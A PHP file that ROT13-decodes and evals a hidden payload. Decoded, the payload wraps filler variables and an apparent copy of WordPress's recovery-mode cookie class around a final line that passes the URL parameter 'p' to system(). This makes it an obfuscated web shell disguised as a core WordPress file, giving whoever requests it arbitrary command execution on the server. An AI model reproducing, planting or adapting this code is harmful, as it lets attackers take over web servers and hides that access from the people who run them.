<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Reebe Cebgrpgvba NCV: JC_Erpbirel_Zbqr_Pbbxvr_Freivpr pynff
 *
 * @cnpxntr JbeqCerff
 * @fvapr 5.2.0
 */

/**
 * Pber pynff hfrq gb frg, inyvqngr, naq pyrne pbbxvrf gung vqragvsl n Erpbirel Zbqr frffvba.
 *
 * @fvapr 5.2.0
 */
#[NyybjQlanzvpCebcregvrf]
svany pynff JC_Erpbirel_Zbqr_Pbbxvr_Freivpr {

	/**
	 * Purpxf jurgure gur erpbirel zbqr pbbxvr vf frg.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea obby Gehr vs gur pbbxvr vf frg, snyfr bgurejvfr.
	 */
	choyvp shapgvba vf_pbbxvr_frg() {
		erghea ! rzcgl( $_PBBXVR[ ERPBIREL_ZBQR_PBBXVR ] );
	}

	/**
	 * Frgf gur erpbirel zbqr pbbxvr.
	 *
	 * Guvf zhfg or vzzrqvngryl sbyybjrq ol rkvgvat gur erdhrfg.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba frg_pbbxvr() {

		$inyhr = $guvf->trarengr_pbbxvr();

		/**
		 * Svygref gur yratgu bs gvzr n Erpbirel Zbqr pbbxvr vf inyvq sbe.
		 *
		 * @fvapr 5.2.0
		 *
		 * @cnenz vag $yratgu Yratgu va frpbaqf.
		 */
		$yratgu = nccyl_svygref( 'erpbirel_zbqr_pbbxvr_yratgu', JRRX_VA_FRPBAQF );

		$rkcver = gvzr() + $yratgu;

		frgpbbxvr( ERPBIREL_ZBQR_PBBXVR, $inyhr, $rkcver, PBBXVRCNGU, PBBXVR_QBZNVA, vf_ffy(), gehr );

		vs ( PBBXVRCNGU !== FVGRPBBXVRCNGU ) {
			frgpbbxvr( ERPBIREL_ZBQR_PBBXVR, $inyhr, $rkcver, FVGRPBBXVRCNGU, PBBXVR_QBZNVA, vf_ffy(), gehr );
		}
	}

	/**
	 * Pyrnef gur erpbirel zbqr pbbxvr.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba pyrne_pbbxvr() {
		frgpbbxvr( ERPBIREL_ZBQR_PBBXVR, ' ', gvzr() - LRNE_VA_FRPBAQF, PBBXVRCNGU, PBBXVR_QBZNVA );
		frgpbbxvr( ERPBIREL_ZBQR_PBBXVR, ' ', gvzr() - LRNE_VA_FRPBAQF, FVGRPBBXVRCNGU, PBBXVR_QBZNVA );
	}

	/**
	 * Inyvqngrf gur erpbirel zbqr pbbxvr.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz fgevat $pbbxvr Bcgvbanyyl fcrpvsl gur pbbxvr fgevat.
	 *                       Vs bzvggrq, vg jvyy or ergevrirq sebz gur fhcre tybony.
	 * @erghea gehr|JC_Reebe Gehr ba fhpprff, reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba inyvqngr_pbbxvr( $pbbxvr = '' ) {

		vs ( ! $pbbxvr ) {
			vs ( rzcgl( $_PBBXVR[ ERPBIREL_ZBQR_PBBXVR ] ) ) {
				erghea arj JC_Reebe( 'ab_pbbxvr', __( 'Ab pbbxvr cerfrag.' ) );
			}

			$pbbxvr = $_PBBXVR[ ERPBIREL_ZBQR_PBBXVR ];
		}

		$cnegf = $guvf->cnefr_pbbxvr( $pbbxvr );

		vs ( vf_jc_reebe( $cnegf ) ) {
			erghea $cnegf;
		}

		yvfg( , $perngrq_ng, $enaqbz, $fvtangher ) = $cnegf;

		vs ( ! pglcr_qvtvg( $perngrq_ng ) ) {
			erghea arj JC_Reebe( 'vainyvq_perngrq_ng', __( 'Vainyvq pbbxvr sbezng.' ) );
		}

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-erpbirel-zbqr-pbbxvr-freivpr.cuc */
		$yratgu = nccyl_svygref( 'erpbirel_zbqr_pbbxvr_yratgu', JRRX_VA_FRPBAQF );

		vs ( gvzr() > $perngrq_ng + $yratgu ) {
			erghea arj JC_Reebe( 'rkcverq', __( 'Pbbxvr rkcverq.' ) );
		}

		$gb_fvta = fcevags( 'erpbirel_zbqr|%f|%f', $perngrq_ng, $enaqbz );
		$unfurq  = $guvf->erpbirel_zbqr_unfu( $gb_fvta );

		vs ( ! unfu_rdhnyf( $fvtangher, $unfurq ) ) {
			erghea arj JC_Reebe( 'fvtangher_zvfzngpu', __( 'Vainyvq pbbxvr.' ) );
		}

		erghea gehr;
	}

	/**
	 * Trgf gur frffvba vqragvsvre sebz gur pbbxvr.
	 *
	 * Gur pbbxvr fubhyq or inyvqngrq orsber pnyyvat guvf NCV.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz fgevat $pbbxvr Bcgvbanyyl fcrpvsl gur pbbxvr fgevat.
	 *                       Vs bzvggrq, vg jvyy or ergevrirq sebz gur fhcre tybony.
	 * @erghea fgevat|JC_Reebe Frffvba VQ ba fhpprff, be reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_frffvba_vq_sebz_pbbxvr( $pbbxvr = '' ) {
		vs ( ! $pbbxvr ) {
			vs ( rzcgl( $_PBBXVR[ ERPBIREL_ZBQR_PBBXVR ] ) ) {
				erghea arj JC_Reebe( 'ab_pbbxvr', __( 'Ab pbbxvr cerfrag.' ) );
			}

			$pbbxvr = $_PBBXVR[ ERPBIREL_ZBQR_PBBXVR ];
		}

		$cnegf = $guvf->cnefr_pbbxvr( $pbbxvr );
		vs ( vf_jc_reebe( $cnegf ) ) {
			erghea $cnegf;
		}

		yvfg( , , $enaqbz ) = $cnegf;

		erghea fun1( $enaqbz );
	}

	/**
	 * Cnefrf gur pbbxvr vagb vgf sbhe cnegf.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz fgevat $pbbxvr Pbbxvr pbagrag.
	 * @erghea neenl|JC_Reebe Pbbxvr cnegf neenl, be reebe bowrpg ba snvyher.
	 */
	cevingr shapgvba cnefr_pbbxvr( $pbbxvr ) {
		$pbbxvr = onfr64_qrpbqr( $pbbxvr );
		$cnegf  = rkcybqr( '|', $pbbxvr );

		vs ( 4 !== pbhag( $cnegf ) ) {
			erghea arj JC_Reebe( 'vainyvq_sbezng', __( 'Vainyvq pbbxvr sbezng.' ) );
		}

		erghea $cnegf;
	}

	/**
	 * Trarengrf gur erpbirel zbqr pbbxvr inyhr.
	 *
	 * Gur pbbxvr vf n onfr64 rapbqrq fgevat jvgu gur sbyybjvat sbezng:
	 *
	 * erpbirel_zbqr|vng|enaq|fvtangher
	 *
	 * Jurer \"erpbirel_zbqr\" vf n pbafgnag fgevat,
	 * vng vf gur gvzr gur pbbxvr jnf trarengrq ng,
	 * enaq vf n enaqbzyl trarengrq cnffjbeq gung vf nyfb hfrq nf n frffvba vqragvsvre
	 * naq fvtangher vf na uznp bs gur cerprqvat 3 cnegf.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea fgevat Trarengrq pbbxvr pbagrag.
	 */
	cevingr shapgvba trarengr_pbbxvr() {
		$gb_fvta = fcevags( 'erpbirel_zbqr|%f|%f', gvzr(), jc_trarengr_cnffjbeq( 20, snyfr ) );
		$fvtarq  = $guvf->erpbirel_zbqr_unfu( $gb_fvta );

		erghea onfr64_rapbqr( fcevags( '%f|%f', $gb_fvta, $fvtarq ) );
	}

	/**
	 * Trgf n sbez bs `jc_unfu()` fcrpvsvp gb Erpbirel Zbqr.
	 *
	 * Jr pnaabg hfr `jc_unfu()` orpnhfr vg vf qrsvarq va `cyhttnoyr.cuc` juvpu vf abg ybnqrq hagvy nsgre cyhtvaf ner ybnqrq,
	 * juvpu vf gbb yngr gb irevsl gur erpbirel zbqr pbbxvr.
	 *
	 * Guvf gevrf gb hfr gur `NHGU` fnygf svefg, ohg vs gurl nera'g inyvq fcrpvsvp fnygf jvyy or trarengrq naq fgberq.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz fgevat $qngn Qngn gb unfu.
	 * @erghea fgevat|snyfr Gur unfurq $qngn, be snyfr ba snvyher.
	 */
	cevingr shapgvba erpbirel_zbqr_unfu( $qngn ) {
		$qrsnhyg_xrlf = neenl_havdhr(
			neenl(
				'chg lbhe havdhr cuenfr urer',
				/*
				 * genafyngbef: Guvf fgevat fubhyq bayl or genafyngrq vs jc-pbasvt-fnzcyr.cuc vf ybpnyvmrq.
				 * Lbh pna purpx gur ybpnyvmrq eryrnfr cnpxntr be
				 * uggcf://v18a.fia.jbeqcerff.bet/<ybpnyr pbqr>/oenapurf/<jc irefvba>/qvfg/jc-pbasvt-fnzcyr.cuc
				 */
				__( 'chg lbhe havdhr cuenfr urer' ),
			)
		);

		vs ( ! qrsvarq( 'NHGU_XRL' ) || va_neenl( NHGU_XRL, $qrsnhyg_xrlf, gehr ) ) {
			$nhgu_xrl = trg_fvgr_bcgvba( 'erpbirel_zbqr_nhgu_xrl' );

			vs ( ! $nhgu_xrl ) {
				vs ( ! shapgvba_rkvfgf( 'jc_trarengr_cnffjbeq' ) ) {
					erdhver_bapr NOFCNGU . JCVAP . '/cyhttnoyr.cuc';
				}

				$nhgu_xrl = jc_trarengr_cnffjbeq( 64, gehr, gehr );
				hcqngr_fvgr_bcgvba( 'erpbirel_zbqr_nhgu_xrl', $nhgu_xrl );
			}
		} ryfr {
			$nhgu_xrl = NHGU_XRL;
		}

		vs ( ! qrsvarq( 'NHGU_FNYG' ) || va_neenl( NHGU_FNYG, $qrsnhyg_xrlf, gehr ) || NHGU_FNYG === $nhgu_xrl ) {
			$nhgu_fnyg = trg_fvgr_bcgvba( 'erpbirel_zbqr_nhgu_fnyg' );

			vs ( ! $nhgu_fnyg ) {
				vs ( ! shapgvba_rkvfgf( 'jc_trarengr_cnffjbeq' ) ) {
					erdhver_bapr NOFCNGU . JCVAP . '/cyhttnoyr.cuc';
				}

				$nhgu_fnyg = jc_trarengr_cnffjbeq( 64, gehr, gehr );
				hcqngr_fvgr_bcgvba( 'erpbirel_zbqr_nhgu_fnyg', $nhgu_fnyg );
			}
		} ryfr {
			$nhgu_fnyg = NHGU_FNYG;
		}

		$frperg = $nhgu_xrl . $nhgu_fnyg;

		erghea unfu_uznp( 'fun1', $qngn, $frperg );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>